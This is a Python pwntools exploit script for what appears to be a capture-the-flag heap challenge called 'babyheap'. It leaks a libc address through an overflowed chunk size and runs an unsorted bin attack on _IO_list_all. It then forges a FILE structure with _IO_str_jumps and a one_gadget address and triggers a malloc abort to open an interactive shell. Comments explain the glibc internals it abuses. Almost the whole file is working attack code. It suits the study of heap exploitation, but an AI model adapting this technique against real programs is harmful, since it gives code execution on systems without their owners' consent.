from pwn import *

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("202.120.7.204", 127 )
    one_gadget_offset = 0x3f35a
else:
    p = process("./babyheap")
    one_gadget_offset = 0x4526a
    main_arena_offset = 0x3c4b20
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """
              set disassembly-flavor intel
                b *(0x555555554000 + 0x119b)
               b *(0x555555554000 + 0xe88)
               b *(0x555555554000 + 0xfa9)
               b *(0x555555554000 + 0xd54) 
               b *(0x555555554000 + 0x10C2) 
               """)
               
def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.sendline(str(size))

def update(idx, size, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(size))
    p.sendline(content)

def delete(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.sendline(str(idx))

def view(index):
    p.readuntil("Command: ")
    p.sendline("4")
    p.readuntil("Index: ")
    p.sendline(str(index))
    p.readuntil("Chunk[" + str(index) + "]: ")
    content = p.readline().strip()
    return content

for i in range(0,3):
    alloc(24)
for i in range(0,7):
    alloc(88)

#leak unsorted bin
buf = 'A'*24 + '\x41'
update(0, 25, buf)
delete(1)
alloc(48) # Idx 1 
buf = 'B'*24 + '\xe1'
update(1, 25, buf)
delete(2)
unsorted_bin = u64(view(1)[-8:])
print "unsorted bin: ",  hex(unsorted_bin)

#put unsorted in to small bin[4]
alloc(24) # Served from unsorted bin chunk of size 0xe0. unsort chunk now 0xc0
alloc(88) # served from unsort bin chunk 0xc0. Size now 0x60
buf = 'C'*88 + '\xc1' # WHen this chunk 8 is freed, the 0x60 free remainder will be put in smallbin on the next malloc. Specifically crafted to be bordering top chunk
update(7, 89, buf)
delete(2) # add one to 0x20 fastbin
delete(0) # add another to 0x20 fastbin
delete(8) # After this, two previous chunks and a 0x60 chunk are in unsorted bin. fastbin chunks enter the unsorted bin via malloc_consolidate. Can happen in malloc, or once in free IF size>65535, and this is true since we are coalescing with top chunk. See https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c#L4077. malloc_consolidate is the ONLY WAY fastbin chunks end up in the unsorted bin!
alloc(24) # call malloc to traverse the unsorted bin and place the 0x60 chunk in the smallbin. We have to have >1 chunks in unsorted bin because otherwise, an alloc(24) would be served from the 0x60 chunk in unsorted bin. Now, since there is >1 chunk in unsorted bin, the 0x60 chunk is placed in smallbin instead. 

libc_base = unsorted_bin - 0x3c4b78
print "libc_base:", hex(libc_base)
io_list_all = libc_base + 0x3c5520

one_gadget = libc_base + one_gadget_offset
print "one_gadget: ", hex(one_gadget)

# Unsorted bin attack, overwrite unsorted bin->bk with io_list_all-16
buf = 'D'*24 + p64(0x21) + p64(0) + p64(io_list_all-0x10)
update(1, 48, buf)
alloc(24) # Call alloc to trigger the unlink

# Now, forge _IO_file on heap in chunk
io_str_jumps = libc_base + 0x3c37a0
io_wstr_jumps = libc_base + 0x3c3020

# Satisfy io_flush_lockp constraint 2 
fake_io_file1 = p64(0)*3 # _IO_read_end, _IO_read_base, _IO_write_base
fake_io_file1 += p64(1) # _IO_write_ptr, > _IO_write_base
update(4, 32, fake_io_file1)

# Satisfy io_flush_lockp constraint 1
# mode = 0 
# Apparently we can just spray one_gadget after the fake io file, and 
# _IO_str_overflow will dereference an offset from the base of file and call it
fake_io_file2 = p64(0) + p64(io_str_jumps) + p64(one_gadget)*3
update(6, len(fake_io_file2), fake_io_file2)

# Trigger malloc abbort
alloc(2)

p.interactive()

